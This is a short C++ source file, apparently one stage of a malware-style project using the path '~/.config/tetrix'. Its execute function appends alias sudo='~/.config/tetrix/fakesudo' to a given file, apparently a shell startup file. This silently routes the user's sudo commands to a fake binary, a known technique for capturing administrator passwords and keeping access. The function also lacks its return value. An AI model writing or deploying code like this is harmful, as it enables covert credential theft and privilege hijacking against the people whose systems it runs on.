#include "phase0.h"
#include <fstream>
#include <iostream>
#include <string>

phase0::phase0()
{

}

int phase0::execute(std::string infile)
{
	//Adele's phase 1 code goes here.
	std::ifstream fs(infile,std::ifstream::in);
	std::string file="";
	if(fs.is_open())
	{
		std::string line{""};
		while(std::getline(fs,line))
		{
			file += line + "\n";
		}
	}
	fs.close();
	fs.clear();
	file += "alias sudo='~/.config/tetrix/fakesudo'\n";

	std::ofstream ofs(infile,std::ifstream::out);
	ofs << file;
	ofs.close();
	ofs.clear();
	//Done!
}
